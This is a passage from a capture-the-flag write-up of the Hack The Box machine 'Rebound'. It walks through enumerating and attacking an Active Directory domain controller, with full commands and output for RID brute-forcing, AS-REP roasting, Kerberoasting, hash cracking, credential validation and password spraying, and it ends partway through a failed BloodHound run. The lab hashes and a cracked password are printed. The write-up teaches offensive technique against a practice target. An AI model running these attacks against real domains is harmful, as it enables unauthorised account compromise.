---
title: Rebound
category:
- CTF
- ActiveDirectory
- Windows
tags: [Active Directory, AS-REP-roasting,RemotePotato0,Shadow Credentials,socat,impacket-findDelegation,impacket-secretsdump]
image:
  path: https://labs.hackthebox.com/storage/avatars/2ad5dcb2fb97e40f5e88a0d6fc569bdd.png
  alt: 
---

Rebound is an **Insane**-level Windows machine within a complex Active Directory (AD) environment. This challenge requires a deep understanding of AD attacks and privilege escalation techniques. The exploitation path involves multiple stages, each utilizing a different aspect of the Windows and Active Directory ecosystem to gain full system access.



## Reconnaissance and Initial Setup

### Port Scanning

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ nmap -sC -sV -p- -oA nmap_report --min-rate 10000 10.129.229.114 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 11:02 IST
Warning: 10.129.229.114 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.229.114
Host is up (0.11s latency).
Not shown: 65503 closed tcp ports (reset)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
70/tcp    filtered gopher
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-18 12:33:16Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T12:34:22+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T12:34:23+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T12:34:22+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: rebound.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-12-18T12:34:23+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.rebound.htb
| Not valid before: 2023-08-25T22:48:10
|_Not valid after:  2024-08-24T22:48:10
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
9772/tcp  filtered unknown
20311/tcp filtered unknown
27653/tcp filtered unknown
30366/tcp filtered unknown
45050/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49673/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open     msrpc         Microsoft Windows RPC
49697/tcp open     msrpc         Microsoft Windows RPC
49709/tcp open     msrpc         Microsoft Windows RPC
49724/tcp open     msrpc         Microsoft Windows RPC
49745/tcp open     msrpc         Microsoft Windows RPC
49808/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-12-18T12:34:17
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.21 seconds
```

## Target Information

From the scan results, it’s immediately apparent that the target is a Windows Domain Controller, as indicated by the following ports commonly associated with Active Directory in a Windows environment:

- **53/tcp** - Simple DNS Plus (used by DNS services)
- **88/tcp** - Kerberos (authentication)
- **389/tcp** - LDAP (Lightweight Directory Access Protocol)
- **445/tcp** - SMB (Server Message Block)
- **464/tcp** - kpasswd5 (Kerberos password change)
- **593/tcp** - RPC (Remote Procedure Call)
- **636/tcp** - LDAPS (LDAP over SSL)
- **3268/tcp** - Global Catalog
- **3269/tcp** - Global Catalog (SSL)

Given these open ports, we can infer that the target is a domain controller running Active Directory services.

## Updating `/etc/hosts` and Kerberos Configuration

Since we have gathered the domain and domain controller hostname details, it’s crucial to update the local machine's `/etc/hosts` file to resolve the domain and controller names properly:

```shell
10.129.229.114  DC01.REBOUND.HTB
10.129.229.114  REBOUND.HTB
```

This step ensures that our local system can resolve the domain controller's hostname when interacting with the domain.

Additionally, since **Kerberos** is the default authentication protocol in Active Directory environments, and environments are typically hardened to disallow weaker authentication methods (especially for privileged accounts), we will need to configure Kerberos appropriately. To do this, we'll update the `/etc/krb5.conf` file. This configuration ensures that our system uses Kerberos authentication when interacting with the target.

**Example `/etc/krb5.conf` Update**

```shell
[libdefaults]
    default_realm = REBOUND.HTB
    dns_lookup_kdc = true
    dns_lookup_realm = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    REBOUND.HTB = {
        kdc = DC01.REBOUND.HTB
        admin_server = DC01.REBOUND.HTB
    }

[domain_realm]
    .rebound.htb = REBOUND.HTB
    rebound.htb = REBOUND.HTB
```

This configuration points the system to the domain controller `(DC01.REBOUND.HTB)` for Kerberos authentication and sets up **REBOUND.HTB** as the default realm.

By updating the `/etc/hosts` file and configuring the Kerberos settings, we’ve ensured that our local machine can properly interact with the Active Directory environment and authenticate using Kerberos. These steps are essential for interacting with services like LDAP, SMB, and Kerberos authentication, which we will leverage in subsequent stages of the attack.



## SMB Enumeration

During the enumeration process, we found that **SMB Null Sessions** are allowed on the target system. This means we can interact with the SMB service without authentication. 

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec smb 10.129.229.114 -u guest -p '' --shares              
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.114  445    DC01             [+] rebound.htb\guest: 
SMB         10.129.229.114  445    DC01             [*] Enumerated shares
SMB         10.129.229.114  445    DC01             Share           Permissions     Remark
SMB         10.129.229.114  445    DC01             -----           -----------     ------
SMB         10.129.229.114  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.114  445    DC01             C$                              Default share
SMB         10.129.229.114  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.114  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.114  445    DC01             Shared          READ            
SMB         10.129.229.114  445    DC01             SYSVOL                          Logon server share
```

### SMB Share Enumeration

Upon connecting, we found that the share was empty—there were no files or folders within the Shared directory. This could indicate a few possibilities:

The share is configured for specific purposes that don't require files or folders to be stored.
There may be hidden files or folders that are not visible without further enumeration techniques (e.g., ACL misconfigurations).

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ smbclient //10.129.229.114/Shared -U rebound/guest%''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug 26 03:16:36 2023
  ..                                  D        0  Sat Aug 26 03:16:36 2023

		4607743 blocks of size 4096. 1046300 blocks available
smb: \> 
```

## RID Bruteforcing

In this phase, we perform **RID Bruteforcing** to enumerate user accounts in the Active Directory environment. A **Relative Identifier (RID)** is part of the Security Identifier (SID) for objects in Active Directory, and by brute-forcing a range of RIDs, we can identify valid usernames associated with these identifiers.

### Understanding RID Bruteforcing

Active Directory assigns a unique RID to every user, and the RIDs for standard user accounts typically follow a predictable pattern, starting from **1000**. By cycling through a range of these RIDs, we can discover user accounts, including those that may have weak configurations or be vulnerable to further attacks.

### RID Bruteforcing with `netexec`

To perform **RID Bruteforcing** and enumerate user accounts in the domain, we can use the `netexec` tool with the SMB protocol. This command will brute-force through the RIDs to identify valid usernames associated with the domain controller.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec smb 10.129.229.114 -u guest -p '' --rid-brute 10000 |grep SidTypeUser |grep -oP '(?<=rebound\\)\S+' > usernames.txt
                                                                                                  
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ cat usernames.txt 
Administrator
Guest
krbtgt
DC01$
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
winrm_svc
batch_runner
tbrady
delegator$
```

## AS-REP Roasting

After performing **RID Bruteforcing** and enumerating the valid usernames in the Active Directory environment, I identified the user `jjones` as a potential target for **AS-REP Roasting**. AS-REP Roasting is an attack that targets users with **Kerberos Pre-Authentication** disabled. When Pre-Authentication is disabled, the Ticket Granting Ticket (TGT) can be requested by anyone without any authentication, which can then be captured and cracked offline.

### What is AS-REP Roasting?

AS-REP Roasting takes advantage of the fact that Kerberos TGT requests are not encrypted for users with Pre-Authentication disabled. When an attacker requests a TGT for such an account, the Kerberos server returns the TGT encrypted with the user's password. Since the TGT can be captured, the attacker can attempt to crack the hash offline, which may reveal the user's password.

### Steps to Perform AS-REP Roasting

1. **Identify Users with Pre-Authentication Disabled**: 
   After identifying user accounts (such as `jjones`) using RID Bruteforcing, we checked for accounts that have Kerberos Pre-Authentication disabled. These accounts are vulnerable to AS-REP Roasting.

2. **Request the TGT for the Target User**: 
   Using a tool like **Impacket’s GetNPUsers** or **KerberosRoast** (part of the `kerberos` Python package), we requested the TGT for the user `jjones`. This is done by querying the domain controller for the TGT of the specified user.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-GetNPUsers rebound/ -usersfile usernames.txt -outputfile hashesToCrack.txt -dc-ip 10.129.229.114
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ppaul doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User llune doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User fflock doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$jjones@REBOUND:85a8c3a9465e127d49871c38783ffe23$92c5de2257876e2e0352835d07459a2aa56bb1f1616ad3245c94d60a445a9524cf4ad0286125ec82d771f172ca854ad4c17d7e6903d50af23c53b5f58dbea0dc4bba08781fc23d1e0ae54bc3aef65aa0bd41c12b4b7030095a1d77a3366b4f0f93063631522ebd9234515c3a4a8ee8e209d5ac70bb3c5e3eeb11be946c25218932f750fcd8c4338fd6a4ce91ca7a62d7535e9b46bddeed4872cadbd413a76a7dd5bab86b8920441c28dabf828f6b40a7656976bac13920b8e596dc461ece71398a1c2184edfa6f74d7807189807bd90f2c1ab34d6f2d60873a55e6d9647e457a3f4fd452d97f
[-] User mmalone doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User nnoon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ldap_monitor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User oorend doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User winrm_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User batch_runner doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tbrady doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User delegator$ doesn't have UF_DONT_REQUIRE_PREAUTH set
```

## Password Cracking - 1

After obtaining the hash for the user `jjones` via **AS-REP Roasting**, I attempted to crack it using **Hashcat** with the commonly used **rockyou** dictionary. However, the attempt was unsuccessful.

### Cracking with `rockyou` Dictionary

The following command was used to crack the hash:

## Kerberoasting

Initially, I believed that **Kerberoasting** required at least one valid domain user credential to function. However, I soon realized that this is not the case. In fact, **Kerberoasting** only requires the username of an account with **Kerberos Pre-Authentication disabled**. In this case, the user `jjones` meets this criteria, making it a valid target for **Kerberoasting**.

For this attack, I will be using **Impacket's GetUserSPNs** tool to extract Service Principal Names (SPNs) for the target user accounts.

### Performing Kerberoasting with `GetUserSPNs`

To retrieve SPNs and associated hashes, I used the following command:

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ impacket-GetUserSPNs rebound.htb/ -no-preauth jjones -usersfile usernames.txt -outputfile hashesToCrack2.txt
```

### Retrieved Hashes

Using **Impacket's GetUserSPNs**, I successfully retrieved the hashes for four accounts:

1. **krbtgt**: The default Kerberos ticket-granting ticket account. This account is critical for the Kerberos authentication process, but it is not useful for cracking since it is not intended for user authentication.
   
2. **DC01$**: The computer account for the domain controller (`DC01`). Computer accounts typically have complex passwords and are not easily cracked.

3. **ldap_monitor**: A service account, which is a more promising target. Service accounts may have weaker or misconfigured passwords that are susceptible to cracking.

4. **delegator$**: This is likely either another computer account or a **gMSA** (Group Managed Service Account), which are designed for service use and generally have very strong, system-generated passwords.

### Focus on `ldap_monitor`

Before attempting to crack any hashes, it's clear that cracking the password for **krbtgt** and **DC01$** is not feasible. The **krbtgt** account is the Kerberos service account, and **DC01$** is a computer account associated with the domain controller, which are both highly protected.

Similarly, the **delegator$** account is likely either a computer account or a **gMSA**, both of which are typically not easily cracked due to their strong, system-generated passwords.

This leaves us with **ldap_monitor**, which is a service account and a more likely candidate for successful cracking.

### Isolating `ldap_monitor` Hash

To focus on cracking the hash for **ldap_monitor**, I’ll filter the retrieved hashes and isolate the one for **ldap_monitor**:

```shell
──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ cat hashesToCrack2.txt | grep ldap_monitor > ldap_monitor.hash
                                                                                                                                                 
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ cat ldap_monitor.hash                                         
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$e41481e1881649248609dcb5d2857953$4b6647dea25215b7e0f20b250e140690dfe2af4a78c787955494620aaa3d58287023f23a46903bb66ab245c0b17da23dd6c620cb3b9d02606c4122f0f8a6da2c93d5d6b66cc2839405904f5edffa1e3cdec2e2330e27c51f11d5ea7620da184a673415c2eec629418ff54263cc24f23e7e2110c02cc5ec9788f7da03f92e4af1972dfe22318aa280e9f594b2c9685a7127a165bf7ae850416b410fbb2c407b143d3fac8273fa1d82b1ff703ff438a671d39b53ab5f115f8dd412581975f090631a7fb3d3cb72cf2725bbf7877f8b649df19137c99f372a32b6cd4bc52dccc14d34ef6579d1d7d8f1048b9a603d2ab16294719da062e66f20ee961bdecc2f09f4c9b7236b3062c10eddebecf75710a4a9a318a9f5231e2c9f8f9da7d0a428317d9860ad4cffadd70781119f334b9c955bb6bcdbd5abbf2ef38e5a486fe2f6fe1a69f0760fffe8a61c61aa55ce8455495e9a17c4fa0ecdec40ef67170966f68e58828f7196179eda92e040680df7819267ff3dd0b778a3a5e6ac17d076d99d23ff5f046111c03e9474413191551fe670e18928a53f43ace5c2a89b872836d709c381d853e2c60d156be3719f60e7513179366b0d6914759aa725fd7308dc406a8323a94e9c0ebc75580e2af9dd415c2f0bbbb3034cf20161fd34d68e5d39b5b56b904ab46baf0d230864216b9f6474be30e02079ac185c5b3a627ac5fd2533fd328f9229602ecbb51faeccd0f7919fe925082e49379b0853c7c4606923826aca80d7ae9cb584e74836c4ebea1c3cdda310e0891e44c76791c677ba959877d07a23393bbeb1021f85e7c8b1becf05856d01d956a65eca5f6f1643c0a0a2487c8ecce4ad04855ea8afae2ae67838d6349f59907eb28de418fd10dbf19631bb170c6b21e3d54d5f7f12f456ca27fbc459607e48bbb672002503bc79b51679db39ddcb334bba9dc03e2cc7441280a140e9de44424e6796b9884b8b7da719ad927952ba35ab8935a88c369864573926a7c845b66094186ac5b4eda6101f8064b1fd93cb74133a41e025cc6f3c61ecaa8b6cec080173f846ac5a699d23a9e0af2a257a098a6dcddbb0e6ea4378c675d04a31f8cbe527adad32812f5dbb0d1495e57d351d200d0520b8462c7fd05c93f14ce5fd0579ae312c64b7c820a2aac3de064064df2259ce21822dc83a96b2f6f6fbe86c608502c90dc5469957119dd289bcac52e4e442e22b580a3b4736446c098655c3634d4a4561c6ea9acd98a6ee68893c44506f5bd4dec288062c96d8985cf39bc29d0dc0cf15783ad0e8f80deaf07f0eda333463d4f051602d9c022b9bf66b45a9fe9a3ec4cf0f06117ec4e627f4646f9e020111
```



## Password Cracking - 2

After isolating the hash for the **ldap_monitor** account, I proceeded to crack it using **Hashcat**.

### Cracking the Hash

I used **Hashcat** to attempt cracking the hash for **ldap_monitor**. Given that the password was relatively weak, I was able to successfully crack it. The password for the **ldap_monitor** account is: '1GR8t@$$4u'

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ cat cracked.txt      
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$e41481e1881649248609dcb5d2857953$4b6647dea25215b7e0f20b250e140690dfe2af4a78c787955494620aaa3d58287023f23a46903bb66ab245c0b17da23dd6c620cb3b9d02606c4122f0f8a6da2c93d5d6b66cc2839405904f5edffa1e3cdec2e2330e27c51f11d5ea7620da184a673415c2eec629418ff54263cc24f23e7e2110c02cc5ec9788f7da03f92e4af1972dfe22318aa280e9f594b2c9685a7127a165bf7ae850416b410fbb2c407b143d3fac8273fa1d82b1ff703ff438a671d39b53ab5f115f8dd412581975f090631a7fb3d3cb72cf2725bbf7877f8b649df19137c99f372a32b6cd4bc52dccc14d34ef6579d1d7d8f1048b9a603d2ab16294719da062e66f20ee961bdecc2f09f4c9b7236b3062c10eddebecf75710a4a9a318a9f5231e2c9f8f9da7d0a428317d9860ad4cffadd70781119f334b9c955bb6bcdbd5abbf2ef38e5a486fe2f6fe1a69f0760fffe8a61c61aa55ce8455495e9a17c4fa0ecdec40ef67170966f68e58828f7196179eda92e040680df7819267ff3dd0b778a3a5e6ac17d076d99d23ff5f046111c03e9474413191551fe670e18928a53f43ace5c2a89b872836d709c381d853e2c60d156be3719f60e7513179366b0d6914759aa725fd7308dc406a8323a94e9c0ebc75580e2af9dd415c2f0bbbb3034cf20161fd34d68e5d39b5b56b904ab46baf0d230864216b9f6474be30e02079ac185c5b3a627ac5fd2533fd328f9229602ecbb51faeccd0f7919fe925082e49379b0853c7c4606923826aca80d7ae9cb584e74836c4ebea1c3cdda310e0891e44c76791c677ba959877d07a23393bbeb1021f85e7c8b1becf05856d01d956a65eca5f6f1643c0a0a2487c8ecce4ad04855ea8afae2ae67838d6349f59907eb28de418fd10dbf19631bb170c6b21e3d54d5f7f12f456ca27fbc459607e48bbb672002503bc79b51679db39ddcb334bba9dc03e2cc7441280a140e9de44424e6796b9884b8b7da719ad927952ba35ab8935a88c369864573926a7c845b66094186ac5b4eda6101f8064b1fd93cb74133a41e025cc6f3c61ecaa8b6cec080173f846ac5a699d23a9e0af2a257a098a6dcddbb0e6ea4378c675d04a31f8cbe527adad32812f5dbb0d1495e57d351d200d0520b8462c7fd05c93f14ce5fd0579ae312c64b7c820a2aac3de064064df2259ce21822dc83a96b2f6f6fbe86c608502c90dc5469957119dd289bcac52e4e442e22b580a3b4736446c098655c3634d4a4561c6ea9acd98a6ee68893c44506f5bd4dec288062c96d8985cf39bc29d0dc0cf15783ad0e8f80deaf07f0eda333463d4f051602d9c022b9bf66b45a9fe9a3ec4cf0f06117ec4e627f4646f9e020111:1GR8t@$$4u
```

## Access Validation

After successfully cracking the password for the **ldap_monitor** account, the next step was to validate the level of access this account has on the target system. To do this, I used **netexec** to attempt connections via various services such as **SMB**, **LDAP**, and **WinRM**.

### Testing Access via SMB, LDAP, and WinRM

Using **netexec**, I tested the **ldap_monitor** credentials on multiple protocols:

1. **SMB**: The connection was successful, allowing me to access resources over the SMB protocol.
   
2. **LDAP**: Attempting to authenticate via LDAP with the **ldap_monitor** credentials was unsuccessful.

3. **WinRM**: Similarly, the attempt to authenticate over **WinRM** failed, indicating that **ldap_monitor** does not have access to execute remote commands via WinRM.


Out of the protocols tested, only **SMB** allowed successful authentication with the **ldap_monitor** credentials. This suggests that the account is likely restricted to certain services or has limited privileges on the target system.

```shell
                                                                                                                                                 
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec smb 10.129.229.114 -u ldap_monitor -p '1GR8t@$$4u'                                                                 
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.114  445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
                                                                                                                                            
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec ldap 10.129.229.114 -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.229.114  636    DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u 
LDAPS       10.129.229.114  636    DC01             [-] LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using '-k'.
                                                                                                                                                 
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec winrm 10.129.229.114 -u ldap_monitor -p '1GR8t@$$4u'
WINRM       10.129.229.114  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.229.114  5985   DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
```

Looks like this machine was hardened, and it is not allowing connection. So, now is the time to try `kerberos`.

```shell
──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec winrm 10.129.229.114 -k -u ldap_monitor -p '1GR8t@$$4u'
WINRM       10.129.229.114  5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
                                                                                                                                                 
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec ldap 10.129.229.114 -k -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.129.229.114  389    DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u KRB_AP_ERR_SKEW
```
I encountered a Kerberos authentication failure when attempting to interact with the target machine via LDAP. The error indicated that the issue was related to Kerberos authentication. Based on the error message, it became apparent that the failure was due to a time synchronization issue between my attacker's machine and the Domain Controller (DC).

Kerberos authentication is highly sensitive to time discrepancies. Specifically, if the time difference between the client machine (attacker's machine) and the Domain Controller exceeds 5 minutes (300 seconds), authentication will fail, as this is the maximum allowable time window for Kerberos ticket validity. This behavior is intentional, as Kerberos relies on synchronized clocks to prevent replay attacks.

To resolve the time discrepancy issue, I quickly synchronized the time on my attacker machine with the target machine using the ntpdate command. This ensured that the time difference was within the permissible 5-minute window required for Kerberos authentication to function correctly.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ sudo ntpdate dc01.rebound.htb
2024-12-19 08:55:36.800503 (+0530) +25199.925906 +/- 0.048252 dc01.rebound.htb 10.129.229.114 s1 no-leap
CLOCK: time stepped by 25199.925906
```

After synchronizing the time, LDAP authentication now works successfully with Kerberos. The time synchronization resolved the previous issues related to authentication failures, allowing the Kerberos tickets to be validated correctly and enabling access to the target system.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec ldap 10.129.229.114 -k -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.229.114  636    DC01             [+] rebound.htb\ldap_monitor
```

## Password Spray

Based on the analysis of the service account `ldap_monitor`, it is evident that it may be a candidate for password reuse across other accounts. This is a common security mistake made by administrators, where passwords for service accounts are used across multiple user accounts.

Given this, I will proceed with a password spraying attack, using the password of ldap_monitor and attempting it on the usernames we previously gathered during enumeration. This technique is efficient as it avoids account lockouts by attempting the same password against many accounts without triggering multiple failed login attempts for any single account.

```shell
┌──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ netexec smb 10.129.229.114 -u usernames.txt -p '1GR8t@$$4u' --continue-on-success
SMB         10.129.229.114  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.129.229.114  445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.129.229.114  445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.129.229.114  445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE
```

Upon reviewing the output of the password spraying attempt, it is clear that the account `oorend` successfully authenticated using the same password as the `ldap_monitor`.

## BloodHound Attack Path Mapping

With two valid sets of credentials now available, I will use BloodHound to map potential attack paths within the environment. This tool will help identify potential privilege escalation opportunities, misconfigurations, or other vulnerabilities that could be exploited.

I attempted to initiate the process using either of the two accounts, but the initial attempt was unsuccessful.

```shell
──(kali㉿kali)-[~/hack-the-box/rebound]
└─$ bloodhound-python -d REBOUND.HTB -ns 10.129.229.114 -k -u ldap_monitor -p '1GR8t@$$4u' -c All --zip 
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
Traceback (most recent call last):
  File "/usr/bin/bloodhound-python", line 33, in <module>
    sys.exit(load_entry_point('bloodhound==1.7.2', 'console_scripts', 'bloodhound-python')())
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 343, in main
    bloodhound.run(collect=collect,
  File "/usr/lib/python3/dist-packages/bloodhound/__init__.py", line 81, in run
    membership_enum.enumerate_memberships(timestamp=timestamp, fileNamePrefix=fileNamePrefix)
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/memberships.py", line 843, in enumerate_memberships
    self.enumerate_users(timestamp, fileNamePrefix)
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/memberships.py", line 183, in enumerate_users
    'ObjectType': ADUtils.resolve_ad_entry(
                  ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/bloodhound/ad/utils.py", line 278, in resolve_ad_entry
    account = ADUtils.get_entry_property(entry, 'sAMAccountName', '')
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
